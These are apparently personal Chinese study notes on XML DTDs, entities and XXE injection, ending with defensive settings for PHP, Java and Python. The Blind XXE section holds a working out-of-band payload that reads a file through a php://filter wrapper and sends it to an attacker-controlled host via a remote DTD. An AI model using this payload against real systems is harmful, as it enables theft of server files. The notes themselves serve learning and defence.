# XXE

## XML DTD

### •内部DTD

•当DTD在XML内部声明时，要用使用DOCTYPE语法包装声明，如右图

![image-20220804143805448](C:\Users\Lightstar\AppData\Roaming\Typora\typora-user-images\image-20220804143805448.png)

•定义根元素为book，其子元素为name和price，其类型为“#PCDATA”

![image-20220804143810141](C:\Users\Lightstar\AppData\Roaming\Typora\typora-user-images\image-20220804143810141.png)

•内部实体声明

•格式为 <**!ENTITY** 实体名称 "实体的值">

•DTD实体声明：

![image-20220804144007880](C:\Users\Lightstar\AppData\Roaming\Typora\typora-user-images\image-20220804144007880.png)

•XML调用：![image-20220804144010461](C:\Users\Lightstar\AppData\Roaming\Typora\typora-user-images\image-20220804144010461.png)

### •外部DTD

•通过外部文件的方式来引入DTD，导入格式为：

 <**!DOCTYPE** 根元素名称 **SYSTEM** "外部DTD的URI">

•其中外部DTD可以为本地文件也可以为远程文件

![image-20220804143834298](C:\Users\Lightstar\AppData\Roaming\Typora\typora-user-images\image-20220804143834298.png)

•外部实体声明

•格式为 <**!ENTITY** 实体名称 **SYSTEM** "URI/URL">

•DTD实体声明：

![image-20220804144024203](C:\Users\Lightstar\AppData\Roaming\Typora\typora-user-images\image-20220804144024203.png)

•XML调用：

![image-20220804144027990](C:\Users\Lightstar\AppData\Roaming\Typora\typora-user-images\image-20220804144027990.png)

### •公用DTD

•与外部DTD类似，需要将SYSTEM换成PUBLIC，同时需要指定一个标识名：

 **<****!DOCTYPE** 根元素名称 **PUBLIC** "DTD标识名" "公用DTD的URI">

•下图为Spring配置文件中引用的公用DTD：

![image-20220804143902619](C:\Users\Lightstar\AppData\Roaming\Typora\typora-user-images\image-20220804143902619.png)

## **XML** **实体**

•XML实体是XML的组成之一，指一个预先定义的*数据或数据集合*

•XML中预定义了5个特殊实体，用来代替几个在XML中有特殊意义的字符：

| 实体名 | 对应字符 | 含义            |
| ------ | -------- | --------------- |
| &lt;   | <        | less  than      |
| &gt;   | >        | greater  than   |
| &amp;  | &        | ampersand       |
| &apos; | '        | apostrophe      |
| &quot; | "        | quotation  mark |

## PHP部分

### 漏洞简介

•XML外部实体注入漏洞（XML External Entity Injection，XXE）

•当XML文档可以由攻击者任意构造时，其中的外部实体就会被远程服务器解析，执行其中的内容

•攻击者可以在外部引用中使用多种协议，进行文件读取、命令执行等操作

•是SSRF攻击的一种特殊形式

![image-20220804143533147](C:\Users\Lightstar\AppData\Roaming\Typora\typora-user-images\image-20220804143533147.png)

•结论

1.未对XML文档作任何过滤，解析后回显username内容

2.未禁用外部实体

![image-20220804143706611](C:\Users\Lightstar\AppData\Roaming\Typora\typora-user-images\image-20220804143706611.png)

### Blind XXE

•当远程服务器没有回显的时候，则无法通过这种方式直接读取文件内容

•此时，可以考虑将数据通过带外通道（OOB）取出

•首先读取文件内容，然后访问攻击者服务器，将读取到的文件内容作为URL参数带出

```xml
<?xml version="1.0"?>

<!DOCTYPE ANY[

<!ENTITY % send SYSTEM 'http://ip:8877/test.dtd'>

  %send;

  %test;

  %back;

]>



test.dtd:

<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///tmp/flag">

<!ENTITY % test "<!ENTITY &#37; back SYSTEM 'http://ip:1234/?file=%file;'>">
```



利用python3起一个简单的web服务，命令`python3 -m http.server [port]`，然后再web目录(/var/www)下放相对应的文件，即可远程文件读取。

## **XXE** **漏洞防御**

1.过滤用户提交的XML数据

•如 <!DOCTYPE 、<!ENTITY 、SYSTEM 、PUBLIC

2.禁用外部实体

```php
•PHP

•libxml_disable_entity_loader(true);
```

```java
•Java 

•DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

•dbf.setExpandEntityReferences(false);
```

```python
•Python

•from lxml import etree

•xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```

## `XXE `进阶

1.  `localdtd`
2.  `javaxxe`